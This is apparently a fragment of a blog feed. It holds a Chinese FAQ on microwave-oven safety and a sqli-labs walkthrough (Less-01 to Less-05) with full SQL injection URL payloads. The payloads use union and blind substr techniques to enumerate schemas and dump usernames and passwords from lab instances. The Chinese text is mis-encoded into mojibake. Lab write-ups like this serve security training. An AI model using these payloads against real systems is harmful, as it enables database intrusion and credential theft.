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"></p>              </div>            </details><h4 id="å¾®æ³¢ç‚‰åŠ çƒ­é£Ÿç‰©ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨ï¼Ÿ"><a href="#å¾®æ³¢ç‚‰åŠ çƒ­é£Ÿç‰©ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨ï¼Ÿ" class="headerlink" title="å¾®æ³¢ç‚‰åŠ çƒ­é£Ÿç‰©ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨ï¼Ÿ"></a>å¾®æ³¢ç‚‰åŠ çƒ­é£Ÿç‰©ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨ï¼Ÿ</h4><details ><summary> ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ </summary>              <div class='content'>              <p>æƒ³çŸ¥é“æ˜¯å¦è‡´ç™Œï¼Œå¾—ä»å¾®æ³¢ç‚‰åŠ çƒ­çš„æœ¬è´¨è¯´èµ·</p><p>å¾®æ³¢ç‚‰åŠ çƒ­çš„å…¶å®æ˜¯é£Ÿç‰©ä¸­çš„æ°´ã€‚å½“å¾®æ³¢è¾å°„åˆ°é£Ÿå“ä¸Šæ—¶ï¼Œæ°´çš„ææ€§åˆ†å­çš„å–å‘å°†éšå¾®æ³¢åœºè€Œå˜åŠ¨ã€‚ç”±äºé£Ÿå“ä¸­æ°´çš„ææ€§åˆ†å­çš„è¿™ç§è¿åŠ¨ï¼Œä»¥åŠç›¸é‚»åˆ†å­é—´çš„ç›¸äº’ä½œç”¨ï¼Œäº§ç”Ÿäº†ç„¦è€³çƒ­ï¼Œä»è€ŒåŠ çƒ­é£Ÿç‰©ï¼Œæ‰€ä»¥å¾®æ³¢ç‚‰åŠ çƒ­ä¸ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨</p><p><img src="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" class="lazyload" data-srcset="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" srcset="data:image/png;base64,666"></p>              </div>            </details><h4 id="å¾®æ³¢ç‚‰é—¨çš„é‚£å—å¯è§†çª—å£éƒ¨åˆ†æœ‰æ´ï¼Œä¼šä¸ä¼šäº§ç”Ÿè¾å°„å‘¢ï¼Ÿ"><a href="#å¾®æ³¢ç‚‰é—¨çš„é‚£å—å¯è§†çª—å£éƒ¨åˆ†æœ‰æ´ï¼Œä¼šä¸ä¼šäº§ç”Ÿè¾å°„å‘¢ï¼Ÿ" class="headerlink" title="å¾®æ³¢ç‚‰é—¨çš„é‚£å—å¯è§†çª—å£éƒ¨åˆ†æœ‰æ´ï¼Œä¼šä¸ä¼šäº§ç”Ÿè¾å°„å‘¢ï¼Ÿ"></a>å¾®æ³¢ç‚‰é—¨çš„é‚£å—å¯è§†çª—å£éƒ¨åˆ†æœ‰æ´ï¼Œä¼šä¸ä¼šäº§ç”Ÿè¾å°„å‘¢ï¼Ÿ</h4><details ><summary> ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ </summary>              <div class='content'>              <p>æ¥äººï¼Œä¸Šå…¬å¼</p><p><a href="https://www.helloimg.com/image/Ga0UZo"><img src="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" srcset="data:image/png;base64,666" alt="Ga0UZo.png"></a></p><p>å¯ä»¥çœ‹å‡ºå¾®æ³¢çš„æ³¢é•¿å¤§æ¦‚åœ¨12cmå·¦å³ï¼Œæ¯”å¾®æ³¢ç‚‰é—¨ä¸Šçš„å°æ´ç›´å¾„å¤§å¾—å¤šï¼Œå¾®æ³¢æ ¹æœ¬å‡ºä¸æ¥</p><p><a href="https://www.helloimg.com/image/Ga0fct"><img src="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" srcset="data:image/png;base64,666" alt="Ga0fct.jpg"></a></p>              </div>            </details><h4 id="å¾®æ³¢ç‚‰åŠ çƒ­çš„é£Ÿå“ï¼Œä¼šä¸ä¼šæ”¹å˜é£Ÿå“æœ¬èº«çš„è¥å…»æˆåˆ†ï¼Ÿ"><a href="#å¾®æ³¢ç‚‰åŠ çƒ­çš„é£Ÿå“ï¼Œä¼šä¸ä¼šæ”¹å˜é£Ÿå“æœ¬èº«çš„è¥å…»æˆåˆ†ï¼Ÿ" class="headerlink" title="å¾®æ³¢ç‚‰åŠ çƒ­çš„é£Ÿå“ï¼Œä¼šä¸ä¼šæ”¹å˜é£Ÿå“æœ¬èº«çš„è¥å…»æˆåˆ†ï¼Ÿ"></a>å¾®æ³¢ç‚‰åŠ çƒ­çš„é£Ÿå“ï¼Œä¼šä¸ä¼šæ”¹å˜é£Ÿå“æœ¬èº«çš„è¥å…»æˆåˆ†ï¼Ÿ</h4><details ><summary> ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ </summary>              <div class='content'>              <p>æˆ‘ä»¬è¦æ˜ç™½çš„æ˜¯ï¼šä»»ä½•å½¢å¼çš„çƒ¹é¥ªéƒ½ä¼šç ´åé£Ÿç‰©ä¸­çš„è¥å…»æˆåˆ†ï¼Œä½†å…³é”®çš„å˜é‡æ˜¯çƒ¹é¥ªä¸­æ‰€ç”¨æ°´çš„å¤šå°‘ï¼Œçƒ¹é¥ªçš„æ—¶é—´ï¼Œä»¥åŠæ¸©åº¦ã€‚</p><p>æ­£å¸¸çš„å¾®æ³¢çƒ¹é¥ªç”±äºæ—¶é—´çŸ­ï¼Œé¿å…äº†ä¼ ç»Ÿçƒ¹é¥ªä¸­é£Ÿç‰©è¡¨é¢æ¸©åº¦è¿‡é«˜çš„å¼Šç«¯ï¼Œæ²¹çƒŸæ›´å°‘ï¼Œæ‰€ä»¥äº§ç”Ÿçš„è‡´ç™Œç‰©ä¹Ÿæ›´å°‘ã€‚è€Œä¸”ï¼Œåœ¨çƒ¹é¥ªæ–¹æ³•ä¸­ï¼Œå¾®æ³¢ç‚‰åŠ çƒ­å¯¹é£Ÿå“è¥å…»æˆåˆ†çš„ä¿æŠ¤æ˜¯å±äºæ¯”è¾ƒå¥½çš„ï¼Œâ€œèƒ½æœ€å¤§é™åº¦åœ°ä¿ç•™é£Ÿå“çš„è¥å…»åŠåŸæœ‰çš„è‰²é¦™å‘³â€ã€‚</p>              </div>            </details><blockquote><p>èµ„æ–™å‚è€ƒï¼š</p><p><a href="http://tech.sina.com.cn/e/2017-11-29/doc-ifypapmz6013246.shtml">æ±‚çœŸæµ‹è¯•ï¼šå¾®æ³¢ç‚‰è¾å°„å¤§ï¼Ÿæ¯”æ‰‹æœºå¤§å¤šäº†|é£Ÿå“|å¾®æ³¢ç‚‰|å¾®æ³¢_æ–°æµªç§‘æŠ€_æ–°æµªç½‘ (sina.com.cn)</a></p><p><a href="https://post.smzdm.com/p/584186/">è€çˆ¸è¯„æµ‹ï¼šè®©æˆ‘ä»¬è°ˆè°ˆå…³äºå¾®æ³¢ç‚‰çš„è¾å°„é—®é¢˜_å¾®æ³¢ç‚‰_ä»€ä¹ˆå€¼å¾—ä¹° (smzdm.com)</a></p><p>éƒ¨åˆ†å›¾æºå¿…åº”ï¼Œä¾µåˆ </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="2021/11/30/sqli-labs/"/>
      <url>2021/11/30/sqli-labs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç”¨æ ¡å›­ç½‘å¯èƒ½ä¸èƒ½æˆåŠŸå‘é€payloadï¼Œåˆ‡è®°ï¼ï¼ï¼</p></blockquote><a id="more"></a><h2 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h2><ul><li><p>å…ˆåˆ¤æ–­æ˜¯å­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" srcset="data:image/png;base64,666" alt="Ga9XGq.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1</a> and 1=2â€“+</em></strong></p><hr><ul><li><p>å†åˆ¤æ–­æ³¨å…¥ç‚¹</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" srcset="data:image/png;base64,666" alt="Ga9m9b.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,2,3â€“+</em></strong></p><hr><ul><li><p>æŸ¥çœ‹æ•°æ®åº“åç§°</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" srcset="data:image/png;base64,666" alt="Ga9sko.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,database(),3â€“+</em></strong></p><hr><ul><li><p>æŸ¥çœ‹åº“ä¸­çš„è¡¨</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" srcset="data:image/png;base64,666" alt="Ga9q0T.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=â€securityâ€â€“+</em></strong></p><hr><ul><li><p>æŸ¥çœ‹ç”¨æˆ·è¡¨ä¸­å­—æ®µ</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" srcset="data:image/png;base64,666" alt="Ga9e4r.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=â€usersâ€â€“+</em></strong></p><hr><ul><li><p>æŸ¥çœ‹ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" srcset="data:image/png;base64,666" alt="Ga9JxK.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username,password),3 from security.usersâ€“+</em></strong></p><hr><ul><li><p>æ¢ä¸ªæ–¹å¼æ˜¾ç¤º</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" srcset="data:image/png;base64,666" alt="Ga9xj1.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from security.usersâ€“+</em></strong></p><hr><h2 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h2><ul><li><p>åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" srcset="data:image/png;base64,666"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1</a></em></strong></p><hr><ul><li><p>åˆ¤æ–­æ³¨å…¥ç‚¹</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" srcset="data:image/png;base64,666" alt="Ga9H0u.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>å¾€ä¸‹æ“ä½œä¸ç¬¬ä¸€é¢˜ç±»ä¼¼ï¼Œpayloadå°±å·®äº†ä¸€ä¸ªå•å¼•å·</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" srcset="data:image/png;base64,666" alt="Ga9bjv.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h2><ul><li><p>åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" srcset="data:image/png;base64,666" alt="Ga9NuR.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1</a></em></strong></p><hr><ul><li><p>è¯¥é¢˜ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œä½†ç›´æ¥ä½¿ç”¨è”åˆæ³¨å…¥æŠ¥é”™</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" srcset="data:image/png;base64,666" alt="Ga90Nn.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œåœ¨idè¡¨ç¤ºçš„æ•°æ®åŠå¼•å·ååŠ ä¸Šæ‹¬å·ï¼Œå†è¿›è¡Œè”åˆæ³¨å…¥ï¼Œæ³¨å…¥æˆåŠŸ</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" srcset="data:image/png;base64,666" alt="Ga9vRP.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>å¾€ä¸‹ä¸ç¬¬ä¸€é¢˜ç›¸åŒï¼Œunionåçš„payloadä¸€è‡´</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" srcset="data:image/png;base64,666" alt="Ga9wA6.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h2><ul><li><p>åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" srcset="data:image/png;base64,666" alt="Ga98Ih.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1</a></em></strong></p><hr><ul><li><p>ä½¿ç”¨å•å¼•å·è¿›è¡Œé—­åˆï¼ŒæŠ¥é”™</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" srcset="data:image/png;base64,666" alt="Ga9I10.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>ç»„åˆå•å¼•å·ã€åŒå¼•å·ä»¥åŠæ‹¬å·å¾—åˆ°æ³¨å…¥ç‚¹</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" srcset="data:image/png;base64,666" alt="Ga97r5.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;</a>) union select 1,2,3â€“+</em></strong></p><hr><ul><li><p>å¾€ä¸‹æ­¥éª¤ä¸ä¸Šè¿°é¢˜ç›®ç›¸åŒ</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" srcset="data:image/png;base64,666" alt="Ga96lm.png"></p></li></ul><p><strong><em>payloadï¼š<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h2><ul><li><p>åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>å›æ˜¾æŠ¥é”™æ•°æ®ï¼Œå°è¯•ç›²æ³¨</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetUSz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetUSz.png" srcset="data:image/png;base64,666" alt="GetUSz.png"></p></li></ul><p><strong>payload</strong>ï¼š<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+</a></p><hr><ul><li><p>å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œåˆ‡ç‰‡ï¼Œå†ä¸å„ä¸ªå­—ç¬¦æ¯”è¾ƒï¼Œæ ¹æ®æŠ¥é”™ä¸å¦åˆ¤æ–­æ¯”è¾ƒç»“æœ</p><p><img src="https://www.helloimg.com/images/2021/12/05/Get68n.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/Get68n.png" srcset="data:image/png;base64,666" alt="Get68n.png"></p></li></ul><p><strong>payload</strong>ï¼š<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li><p>æ”¹å˜ä¸Šä¸€ä¸ªpayloadä¸­cçš„å€¼ä»¥éå†å‡ºæ•°æ®åº“åç§°ï¼Œå†ç»“åˆå‰é¢é¢˜ç›®çš„payloadé€æ­¥çˆ†å‡ºè¡¨åå’Œåˆ—å</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetKoR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetKoR.png" srcset="data:image/png;base64,666" alt="GetKoR.png"></p></li></ul><p><strong>payload</strong>ï¼š<a 